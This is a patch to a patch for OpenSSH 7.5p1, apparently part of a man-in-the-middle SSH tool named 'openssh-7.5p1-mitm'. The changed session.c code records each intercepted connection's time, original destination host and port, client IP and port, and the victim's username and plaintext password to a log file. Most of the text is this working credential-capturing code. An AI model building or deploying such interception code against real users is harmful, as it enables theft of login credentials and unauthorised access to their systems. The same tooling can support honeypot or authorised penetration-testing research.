@@ -4021,7 +4021,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	gid_t old_gid = getgid();
 diff -Naur openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c > diff_session
 --- openssh-7.5p1/session.c	2017-03-20 03:39:27.000000000 +0100
-+++ openssh-7.5p1-mitm/session.c	2018-05-28 13:56:55.174085382 +0200
++++ openssh-7.5p1-mitm/session.c	2018-05-28 15:33:52.413878731 +0200
 @@ -35,11 +35,15 @@
  
  #include "includes.h"
@@ -4446,7 +4446,7 @@ diff -Naur openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c > diff_session
  #ifdef USE_PAM
  	if (options.use_pam) {
  		sshpam_cleanup();
-@@ -2578,3 +2701,234 @@
+@@ -2578,3 +2701,249 @@
  	return remote;
  }
  
@@ -4497,20 +4497,35 @@ diff -Naur openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c > diff_session
 +    }
 +
 +    struct ssh *ssh = active_state;
-+    time_t current_time = time(NULL);
++    time_t t = time(NULL);
 +    int port = ssh_remote_port(ssh);
++    char srcport[64];
++    sprintf(srcport, "%d", port);
++    struct tm *ptm = gmtime(&t);
++    char buf[256];
++    strftime(buf, sizeof buf, "%F %T", ptm);
++    int original_port = lol->original_port;
++    char dstport[64];
++    sprintf(dstport, "%d", original_port);
++    // Timestamp
 +    write(s->session_log_fd, "Time: ", 6);
-+    write(s->session_log_fd, &current_time, sizeof(time_t));
++    write(s->session_log_fd, buf, strlen(buf));
++    // Dst IP
 +    write(s->session_log_fd, "\nHostname: ", 11);
 +    write(s->session_log_fd, lol->original_host, strlen(lol->original_host));
 +    write(s->session_log_fd, ":", 1);
-+    write(s->session_log_fd, &(lol->original_port), sizeof(lol->original_port));
++    // Dst Port
++    write(s->session_log_fd, dstport, strlen(dstport));
++    // Src IP
 +    write(s->session_log_fd, "\nOrigin: ", 9);
-+    write(s->session_log_fd, ssh_remote_ipaddr(ssh), sizeof(ssh_remote_ipaddr(ssh)));
++    write(s->session_log_fd, ssh_remote_ipaddr(ssh), strlen(ssh_remote_ipaddr(ssh)));
 +    write(s->session_log_fd, ":", 1);
-+    write(s->session_log_fd, &port, sizeof(int));
++    // Src Port
++    write(s->session_log_fd, srcport, strlen(srcport));
++    // Username
 +    write(s->session_log_fd, "\nUsername: ", 11);
 +    write(s->session_log_fd, lol->username, strlen(lol->username));
++    // Password
 +    write(s->session_log_fd, "\nPassword: ", 11);
 +    write(s->session_log_fd, lol->password, strlen(lol->password));
 +    if (command != NULL) {
